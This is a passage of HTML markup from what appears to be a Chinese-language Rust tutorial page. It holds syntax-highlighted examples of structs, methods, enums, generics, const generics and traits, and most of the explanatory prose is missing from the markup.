keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>impl</p>\n<h3 id=\"-amp-\"><a href=\"#-amp-\" class=\"headerlink\" title=\"&amp;\"></a>&amp;</h3><p><code></code><code></code></p>\n<p></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// newCircleself</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Circle&amp;selfCircle</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>&amp;self</code> <code>self: &amp;Self</code> <code>circle.area()</code></p>\n<p><strong></strong></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token attribute attr-name\">#![allow(unused)]</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Quit</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Move</span> <span class=\"token punctuation\">{</span> x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">ChangeColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Message</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">call</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// </span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tm<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"-amp--trait\"><a href=\"#-amp--trait\" class=\"headerlink\" title=\"&amp;(trait)\"></a>&amp;(trait)</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">{</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i8: {}\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">2i8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3i8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i32: {}\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add f64: {}\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<h3 id=\"trait\"><a href=\"#trait\" class=\"headerlink\" title=\"trait\"></a>trait</h3><p></p>\n<p>kotlin</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>ops<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">Output</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">T</span><span class=\"token operator\">&gt;&gt;</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">{</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>std::ops::Add&lt;Output = T&gt;</code>kotlinrust<code>trait </code>,<code>std::ops::Add&lt;Output = T&gt;</code>,output</p>\n<blockquote>\n<p><strong></strong></p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Option</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">None</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">x</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token class-name\">Point</span> <span class=\"token punctuation\">{</span> x<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p.x = {}\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><code>T,U</code>  <code>Point</code> <code>V,W</code>  <code>mixup</code> </p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p> <code>Point&lt;T&gt;</code>  <code>T</code> </p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">f32</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">distance_from_origin</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f32</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> <code>Point&lt;f32&gt;</code>  <code>distance_from_origin</code> <code>T</code>  <code>f32</code>  <code>Point&lt;T&gt; </code><code>(0.0, 0.0)</code> </p>\n<p></p>\n</blockquote>\n<h3 id=\"const-\"><a href=\"#const-\" class=\"headerlink\" title=\"const \"></a>const </h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?}\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>const</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">usize</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">;</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?}\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>usizeusize</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p> Rust </p>\n<p>Rust </p>\n<p></p>\n<p>Rust  <strong></strong>(<em>monomorphization</em>)</p>\n<p></p>\n</blockquote>\n<h2 id=\"-trait\"><a href=\"#-trait\" class=\"headerlink\" title=\"(trait)\"></a>(trait)</h2><p>javainterface</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize1</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"\"</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Post</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">pub</span> title<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">pub</span> author<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// </span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Post</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}, {}\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>author<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Weibo</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">pub</span> username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Weibo</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}{}\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>RustKotlin</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p> <code>Summary</code>  <code>pub</code>  <code>Summary</code> </p>\n<p><strong> <code>A</code>  <code>T</code> <code>A</code>  <code>T</code> </strong> <code>Post</code>  <code>Display</code>  <code>Post</code>  <code>String</code>  <code>Summary</code>  <code>Summary</code> </p>\n<p> <code>String</code>  <code>Display</code> </p>\n<p><strong></strong></p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! {}\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Display</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// where</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span><span class=\"token 